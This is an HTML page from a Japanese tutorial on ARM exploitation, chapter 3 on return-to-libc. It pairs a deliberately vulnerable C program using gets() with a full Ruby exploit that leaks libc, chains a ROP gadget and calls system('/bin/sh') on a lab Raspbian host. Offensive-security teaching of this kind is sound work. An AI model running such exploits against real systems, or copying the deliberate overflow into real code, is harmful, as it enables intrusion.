<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>3. Return to libc</title>
    <meta name="description" content="">
    
    
    <link rel="preload" href="/ARM_Exploit/assets/css/0.styles.e466e900.css" as="style"><link rel="preload" href="/ARM_Exploit/assets/js/app.c064dbfe.js" as="script"><link rel="preload" href="/ARM_Exploit/assets/js/2.2d619ac4.js" as="script"><link rel="preload" href="/ARM_Exploit/assets/js/9.66bb3eef.js" as="script"><link rel="prefetch" href="/ARM_Exploit/assets/js/10.27ea7a0c.js"><link rel="prefetch" href="/ARM_Exploit/assets/js/3.96930671.js"><link rel="prefetch" href="/ARM_Exploit/assets/js/4.edb5607f.js"><link rel="prefetch" href="/ARM_Exploit/assets/js/5.d057307c.js"><link rel="prefetch" href="/ARM_Exploit/assets/js/6.f5bf7ae1.js"><link rel="prefetch" href="/ARM_Exploit/assets/js/7.0ad3fa28.js"><link rel="prefetch" href="/ARM_Exploit/assets/js/8.746eb6c5.js">
    <link rel="stylesheet" href="/ARM_Exploit/assets/css/0.styles.e466e900.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/ARM_Exploit/" class="home-link router-link-active"></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/ARM_Exploit/" class="nav-link">Home</a></div><div class="nav-item"><a href="https://twitter.com/encry1024" target="_blank" rel="noopener noreferrer" class="nav-link external">
  About me
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div><div class="nav-item"><a href="https://github.com/owlinux1000/ARM_Exploit" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Repository
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/ARM_Exploit/" class="nav-link">Home</a></div><div class="nav-item"><a href="https://twitter.com/encry1024" target="_blank" rel="noopener noreferrer" class="nav-link external">
  About me
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div><div class="nav-item"><a href="https://github.com/owlinux1000/ARM_Exploit" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Repository
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <!----></nav>  <ul class="sidebar-links"><li><a href="/ARM_Exploit/" class="sidebar-link">Home</a></li><li><a href="/ARM_Exploit/chapter01/" class="sidebar-link">1. Crafting Shellcode</a></li><li><a href="/ARM_Exploit/chapter02/" class="sidebar-link">2. Buffer Overflow</a></li><li><a href="/ARM_Exploit/chapter03/" class="active sidebar-link">3. Return to libc</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/ARM_Exploit/chapter03/#_3-1-return-to-libc-とは" class="sidebar-link">3.1 Return to libc とは</a></li><li class="sidebar-sub-header"><a href="/ARM_Exploit/chapter03/#_3-2-return-to-libcを用いたシェル奪取" class="sidebar-link">3.2 Return to libcを用いたシェル奪取</a></li><li class="sidebar-sub-header"><a href="/ARM_Exploit/chapter03/#_3-3-まとめ" class="sidebar-link">3.3 まとめ</a></li></ul></li><li><a href="/ARM_Exploit/chapter04/" class="sidebar-link">4. Playing with Canary</a></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="_3-return-to-libc"><a href="#_3-return-to-libc" aria-hidden="true" class="header-anchor">#</a> 3. Return to libc</h1> <p>前章で、スタック領域にシェルコードを配置して実行していました。しかしながら、本手法はNX 機能を無効化している場合やある領域に実行権限がある場合のみ可能な攻撃手段です。近年ではデフォルトで有効なため、Return to libc と呼ばれるテクニックを使いバイパスします。本章では、このReturn to libc というテクニックについて原理を学び演習問題を通して実践的な理解を深めます。</p> <h2 id="_3-1-return-to-libc-とは"><a href="#_3-1-return-to-libc-とは" aria-hidden="true" class="header-anchor">#</a> 3.1 Return to libc とは</h2> <p>Return to libc は、多くの場合標準で読み込んでおり実行権限のあるglibcの関数などにジャンプし呼び出す攻撃手法のことです。libcには、皆さんご存知の<code>printf</code>関数やOSのコマンド実行をする<code>system</code>関数をはじめとしてかなり多くの関数があります。特にExploit では、<code>system</code> 関数や<code>execve</code> 系関数は使う機会が多いと思います。では、実際にどのような攻撃なのか具体的な例を見ていきましょう。しかしながら、libcのアドレスはASLR（Address Space Layout Randomization）機能によって、ランダム化されており特定は困難です、そこで通常Retrun to libc の攻撃を使うためには、他の脆弱性などでlibc のアドレスをリークし、差分を引くことでlibcのベースアドレスを算出し、算出したベースアドレスに呼びたい関数のオフセットを足すことで、実際のlibc内の関数のアドレスなどを算出します。libc の関数のオフセットを求める際には、<code>nm</code> コマンドを利用します。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ nm -D /lib/arm-linux-gnueabihf/libc.so.6  <span class="token operator">|</span> <span class="token function">grep</span> system
000389c8 T __libc_system
00109eb0 T svcerr_systemerr
000389c8 W system
</code></pre></div><p>また、ある実行ファイルにリンクされているライブラリが何かを知りたければ、<code>ldd</code> コマンドを利用することで確認することができます。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ ldd ret2libc
        /usr/lib/arm-linux-gnueabihf/libarmmem-<span class="token variable">${PLATFORM}</span>.so <span class="token operator">=</span><span class="token operator">&gt;</span> /usr/lib/arm-linux-gnueabihf/libarmmem-v6l.so <span class="token punctuation">(</span>0xb6f28000<span class="token punctuation">)</span>
        libc.so.6 <span class="token operator">=</span><span class="token operator">&gt;</span> /lib/arm-linux-gnueabihf/libc.so.6 <span class="token punctuation">(</span>0xb6dd8000<span class="token punctuation">)</span>
        /lib/ld-linux-armhf.so.3 <span class="token punctuation">(</span>0xb6f3c000<span class="token punctuation">)</span>
</code></pre></div><p>この際、括弧でくくられているアドレスが、ベースアドレスです。ASLR 環境配下だと上記コマンド結果は、実行するたびに異なるアドレスになります。しかしながら、アドレスのランダム化される範囲は少なく、特に末尾3桁は0で固定されています。オフセットなどを減算して末尾3桁が0ではない場合は、正しくベースアドレスを算出できていないので、もう一度計算方法を見直してみましょう。</p> <p>今回の演習問題に使うコードを見てみましょう。</p> <div class="language-c extra-class"><pre class="language-c"><code><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;libc address: %p\n&quot;</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>このソースコードでは、<code>gets</code> 関数が使われているためバッファオーバーフローが起こることがわかります。前章の話しを踏まえて、リターンアドレスを上書きするまでに必要なペイロードのサイズを確かめてみてください。ここでは割愛しますが、36バイトのパディングを入れることでリターンアドレスを書き換えることがわかります。次に、libcアドレスのベースアドレスを特定します。このソースコードでは、<code>stdout</code> のアドレスを事前にリークしてくれています。そこで、<code>nm</code> コマンドを使って<code>stdout</code> のアドレスオフセットを調べてましょう。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>nm -D /lib/arm-linux-gnueabihf/libc.so.6  <span class="token operator">|</span> <span class="token function">grep</span> -w stdout
0014ad90 D _IO_2_1_stdout_
0014ae34 D stdout
</code></pre></div><p>この結果から、2つ同じような名前が出ていることがわかります。このうち1つ目が<code>stdout</code>の実態になっています。<code>stdout</code>は、<code>_IO_2_1_stdout_</code> を指しており、<code>_IO_2_1_stdout_</code>が実際の標準出力用のファイルポインタを指しています。そのため、0x14ad90 がオフセットだとわかりました。では実際にこのコードを実行してみましょう。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ ./ret2libc
./ret2libc
libc address: 0xb6f16d90
</code></pre></div><p>コードを実行すると、アドレスの末尾が0xd90になっており、調べて判明したオフセットを引くことで末尾3桁が0になりlibcのベースアドレスが求められそうなことがわかります。</p> <p>次に、どのようなペイロードを送り込んでReturn to libcを実行するのかを考えていきます。今回は、libc内にある<code>system</code> 関数を用いて、<code>system(&quot;/bin/sh&quot;)</code> を実行することでシェルを起動させる方針です。そのため、先程のlibc ベースアドレスに、<code>system</code> 関数のアドレスオフセットを足すことで実際の<code>system</code>関数アドレスがわかります。次に、引数を設定する必要があります。実は、<code>&quot;/bin/sh&quot;</code> という文字列はlibc内に含まれています。こちらも関数のオフセットと同じ要領で、オフセットを算出し、ベースアドレスに足すことで実際のアドレスを得ることができます。文字列の格納されているアドレスのオフセットが知りたい場合は、<code>strings</code> コマンドを用います。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ strings -tx -a /lib/arm-linux-gnueabihf/libc.so.6  <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">&quot;/bin/sh&quot;</span>
 12bb6c /bin/sh
</code></pre></div><p>上記結果より、オフセットは0x12bb6cだとわかりました。ベースアドレスにこの値を足すことで実際の<code>&quot;/bin/sh&quot;</code> のアドレスが求まりそうです。さて、ここまでで実際に必要なアドレスたちの算出は終わりました。次にどのようにして第1引数であるr0レジスタに<code>&quot;/bin/sh&quot;</code>のアドレスを設定した状態で、<code>system</code> 関数を呼び出すかについて考えていきます。こういう際に便利なのが、<code>pop</code> 命令です。<code>pop</code> 命令は、スタックに配置されている値をレジスタにコピーする命令です。実行ファイルやlibcバイナリの中には、こういった<code>pop</code> 命令が数多く含まれています。そこで、そういった<code>pop</code> 命令にまずは直接ジャンプして、スタックに配置した引数をレジスタに移す処理をした後に、<code>system</code> 関数を呼び出すことを行います。こういった<code>pop</code> 命令や<code>bx</code>で終わるコードの断片（これらのコードをROP Gadgetと言う場合があります）をつなげていくことをROP（Return Oriented Programming）と呼びます。この攻撃はかなり複雑なコードも場合によっては実現可能なためとても便利な手法です。</p> <p>では、バイナリ中から<code>pop</code> 命令を用いたコードを見つけてみましょう。ここでは、すでにlibcのベースアドレスが既知なため、libcから探します。一般にlibc のほうが多くの関数やコードが詰まっているため便利なROP Gadgetが多く存在します。ROP Gadgetを探す場合は、<a href="https://github.com/0vercl0k/rp" target="_blank" rel="noopener noreferrer">rp++<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> を使うのが代表的ですが、どうやらrp++はARMなどには対応していないようなので他のソフトウェアを使います。rp++以外に代表的なのは、<a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener noreferrer">ROPGadget<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> や <a href="https://github.com/sashs/Ropper" target="_blank" rel="noopener noreferrer">ropper<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> です。ここでは、ropper を採用しました。特に深い意味はなくROPGadgetよりは新しいという点ぐらいで選んでいます。ropper のインストールは<code>pip install ropper</code> で入りますが、Qemu環境で入れようとするとビルドに時間がかかるため、ホスト環境に入れてしまうことを強くおすすめします。実際にropper を使ってROP Gadgetを検索してみましょう。今回検索したいのは、r0とpcにpopすることができるROP Gadgetです。ropper のオプションでは、<code>-f</code> でファイルを選び、<code>--search</code> で探すGadgetの文字列を設定できます。今回は試しに、r0のpopから始まるものを設定してみます。</p> <div class="language-bash extra-class"><div class="highlight-lines"><br><br><br><br><br><br><br><br><div class="highlighted"> </div><br></div><pre class="language-bash"><code>$ ropper -f libc.so.6  --search <span class="token string">&quot;pop {r0&quot;</span>
<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> Load gadgets from cache
<span class="token punctuation">[</span>LOAD<span class="token punctuation">]</span> loading<span class="token punctuation">..</span>. <span class="token number">100</span>%
<span class="token punctuation">[</span>LOAD<span class="token punctuation">]</span> removing double gadgets<span class="token punctuation">..</span>. <span class="token number">100</span>%
<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> Searching <span class="token keyword">for</span> gadgets: pop <span class="token punctuation">{</span>r0

<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> File: libc.so.6
0x000da9c0: pop <span class="token punctuation">{</span>r0, r1, r2, r3, ip, lr<span class="token punctuation">}</span><span class="token punctuation">;</span> bx <span class="token function">ip</span><span class="token punctuation">;</span>
0x000791fc: pop <span class="token punctuation">{</span>r0, r4, pc<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre></div><p>実行結果の2つ目に着目してください。途中でr4レジスタのpop が入っていますが、今回設定したいr0とpcの2つのレジスタにpopすることができそうです。今回はこのROP Gadgetを使うことにしましょう。</p> <p>ここまでのアドレスや得たROP Gadgetを用いてスタックに配置するペイロードを図示すると以下のようになります。</p> <table><thead><tr><th style="text-align:left;">値</th></tr></thead> <tbody><tr><td style="text-align:left;">&quot;A&quot; * 36</td></tr> <tr><td style="text-align:left;">pop {r0, r4, pc}</td></tr> <tr><td style="text-align:left;">&quot;/bin/sh&quot; のアドレス</td></tr> <tr><td style="text-align:left;">&quot;AAAA&quot;</td></tr> <tr><td style="text-align:left;">system 関数のアドレス</td></tr></tbody></table> <p>大まかに挙動をまとめると、まずはじめにバッファオーバーフローを用いて、リターンアドレスを<code>pop {r0, r4, pc}</code> で上書きします。そうすると、この命令がスタックに配置されている&quot;/bin/sh&quot;のアドレスをr0に、&quot;AAA&quot;という今回は不要な値をr4に、そして次に実行する命令を指すpcにsystem関数のアドレスを設定します。これにより、<code>system(&quot;/bin/sh&quot;)</code> を実行することができるようになります。</p> <h2 id="_3-2-return-to-libcを用いたシェル奪取"><a href="#_3-2-return-to-libcを用いたシェル奪取" aria-hidden="true" class="header-anchor">#</a> 3.2 Return to libcを用いたシェル奪取</h2> <p>では実際に構築したペイロードで攻撃が成功するかを確かめてみましょう。引き続き<code>socat</code> でバイナリを待ち受けます。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ socat tcp-l:8888,reuseaddr,fork exec:./ret2libc
</code></pre></div><p>次に、ここまでの情報を踏まえて作成したExploit コードを以下に以下に示します。libcのアドレスが正しく計算されているかなど、デバッグ情報を出すようにしています。</p> <div class="language-ruby extra-class"><pre class="language-ruby"><code><span class="token comment">#!/usr/bin/env ruby</span>
<span class="token comment"># coding: utf-8</span>
<span class="token keyword">require</span> <span class="token string">'pwn'</span>

host <span class="token operator">=</span> <span class="token string">'localhost'</span>
port <span class="token operator">=</span> <span class="token number">8888</span>
z <span class="token operator">=</span> <span class="token constant">Sock</span><span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token class-name">host</span><span class="token punctuation">,</span> port
tmp <span class="token operator">=</span> z<span class="token punctuation">.</span>recvline
libc_address <span class="token operator">=</span> tmp<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token regex">/: (.+)\n/</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>to_i<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> <span class="token constant">ELF</span><span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token string">&quot;./libc.so.6&quot;</span>
libc_base <span class="token operator">=</span> libc_address <span class="token operator">-</span> <span class="token number">0x014ad90</span>
libc_system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">&quot;__libc_system&quot;</span><span class="token punctuation">]</span>
libc_binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x12bb6c</span>
pop_r0_r4_pc <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000791fc</span>
puts <span class="token string">&quot;libc base    @ 0x<span class="token interpolation"><span class="token delimiter tag">#{</span>libc_base<span class="token punctuation">.</span>to_s<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token delimiter tag">}</span></span>&quot;</span>
puts <span class="token string">&quot;libc system  @ 0x<span class="token interpolation"><span class="token delimiter tag">#{</span>libc_system<span class="token punctuation">.</span>to_s<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token delimiter tag">}</span></span>&quot;</span>
puts <span class="token string">&quot;libc /bin/sh @ 0x<span class="token interpolation"><span class="token delimiter tag">#{</span>libc_binsh<span class="token punctuation">.</span>to_s<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token delimiter tag">}</span></span>&quot;</span>
payload <span class="token operator">=</span> <span class="token string">&quot;A&quot;</span> <span class="token operator">*</span> <span class="token number">36</span>
payload <span class="token operator">&lt;</span><span class="token operator">&lt;</span> p32<span class="token punctuation">(</span>pop_r0_r4_pc<span class="token punctuation">)</span>
payload <span class="token operator">&lt;</span><span class="token operator">&lt;</span> p32<span class="token punctuation">(</span>libc_binsh<span class="token punctuation">)</span>
payload <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token string">&quot;AAAA&quot;</span>
payload <span class="token operator">&lt;</span><span class="token operator">&lt;</span> p32<span class="token punctuation">(</span>libc_system<span class="token punctuation">)</span>
z<span class="token punctuation">.</span>sendline payload
z<span class="token punctuation">.</span>interact
</code></pre></div><p>上記コードを実行した結果が以下です。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>./solve2.rb
<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> <span class="token string">&quot;ARM_Exploit/docs/chapter03/libc.so.6&quot;</span>
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
libc base    @ 0xb6e20000
libc system  @ 0xb6e589c8
libc /bin/sh @ 0xb6f4bb6c
<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> Switching to interactive mode
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>pi<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>pi<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>pi<span class="token punctuation">)</span>,4<span class="token punctuation">(</span>adm<span class="token punctuation">)</span>,20<span class="token punctuation">(</span>dialout<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,27<span class="token punctuation">(</span>sudo<span class="token punctuation">)</span>,29<span class="token punctuation">(</span>audio<span class="token punctuation">)</span>,44<span class="token punctuation">(</span>video<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,60<span class="token punctuation">(</span>games<span class="token punctuation">)</span>,100<span class="token punctuation">(</span>users<span class="token punctuation">)</span>,105<span class="token punctuation">(</span>input<span class="token punctuation">)</span>,109<span class="token punctuation">(</span>netdev<span class="token punctuation">)</span>,997<span class="token punctuation">(</span>gpio<span class="token punctuation">)</span>,998<span class="token punctuation">(</span>i2c<span class="token punctuation">)</span>,999<span class="token punctuation">(</span>spi<span class="token punctuation">)</span>
</code></pre></div><p>Raspbian のシェルが操作できていることが確認できました。</p> <h2 id="_3-3-まとめ"><a href="#_3-3-まとめ" aria-hidden="true" class="header-anchor">#</a> 3.3 まとめ</h2> <p>本章では、Return to libc という攻撃テクニックについて学びました。本攻撃手法は、NX が有効な場合などシェルコードを簡単に実行できない状況ではとても便利な攻撃手法です。一方で利用するためには、libcアドレスをリークしておく必要があるため他の脆弱性と併用しなければなりませんが、とても強力な攻撃です。</p></div> <footer class="page-edit"><!----> <!----></footer> <div class="page-nav"><p class="inner"><span class="prev">
      ←
      <a href="/ARM_Exploit/chapter02/" class="prev">2. Buffer Overflow</a></span> <span class="next"><a href="/ARM_Exploit/chapter04/">4. Playing with Canary</a>→
    </span></p></div> </main></div><div class="global-ui"></div></div>
    <script src="/ARM_Exploit/assets/js/app.c064dbfe.js" defer></script><script src="/ARM_Exploit/assets/js/2.2d619ac4.js" defer></script><script src="/ARM_Exploit/assets/js/9.66bb3eef.js" defer></script>
  </body>
</html>
